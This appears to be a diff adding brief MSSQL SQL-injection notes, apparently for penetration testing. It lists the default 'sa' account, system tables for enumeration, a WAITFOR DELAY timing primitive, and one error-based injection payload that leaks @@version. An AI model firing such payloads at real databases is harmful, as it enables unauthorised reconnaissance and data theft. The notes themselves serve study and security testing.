@@ -1,0 +1,38 @@
+MSSQL
+sqsh
+
+DEFAULT USERS
+sa
+
+METADATA TABLES
+INFORMATION_SCHEMA
+sys*	-catalog views
+system tables
+	sysobjects
+	sysindexkeys
+	sysindexes
+	syscolumns
+	systypes
+	
+SELECT name FROM sysobjects WHERE xtype = 'U';
+	-enumerate all accessible tables for the current user
+SELECT name FROM sys.tables;
+	-enumerate all accessible tables using the catalog views
+
+Time Delay
+WAITFOR DELAY '0:0:%d'
+	
+T-SQL FUNCTIONS
+https://docs.microsoft.com/en-us/sql/t-sql/functions/functions
+Usage example
+	SELECT @@VERSION AS 'VERSION';
+SQLI example
+	1' and 1=0/@@version;--
+Configuration functions
+@@VERSION
+@@SERVERNAME
+@@SERVICENAME
+@@OPTIONS
+@@MAX_CONNECTIONS
+@@LANGUAGE
+@@DBTS
